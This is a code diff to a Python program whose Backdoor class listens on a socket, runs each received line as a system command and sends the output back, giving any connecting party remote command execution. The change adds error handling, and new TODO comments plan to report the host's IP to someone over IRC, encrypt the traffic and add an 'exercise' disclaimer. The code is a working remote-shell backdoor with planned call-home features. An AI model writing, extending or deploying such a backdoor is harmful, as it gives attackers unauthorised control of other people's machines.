@@ -9,6 +9,11 @@ import subprocess
 import logging
 from threading import Thread
 
+# TODO write proper readme
+# TODO write disclaimer, "this is an exercice, not responsible for blabla"
+# TODO ping someone/somewhere and give ip info (irc ?)
+# TODO encrypt communications
+
 
 class Server:
 
@@ -50,17 +55,24 @@ class Server:
 
 
 class Backdoor(Server):
-    # TODO handle ctrl-c, ctrl-d
     def handle_client(self, socket, address):
         f = socket.makefile()
+
         while not self.should_stop:
             line = f.readline()
             if len(line) == 0:
                 break
             elif line[-1] == '\n':
+                if len(line) == 1:
+                    continue
                 line = line[:-1]
-            out = subprocess.check_output(line)
-            socket.send(out)
+
+            try:
+                out = subprocess.check_output(line)
+                socket.send(out)
+            except Exception as e:
+                socket.send(str(e))
+
         socket.close()
         logging.info("Connection with " + address[0] + ":" +
                      str(address[1]) + " closed")
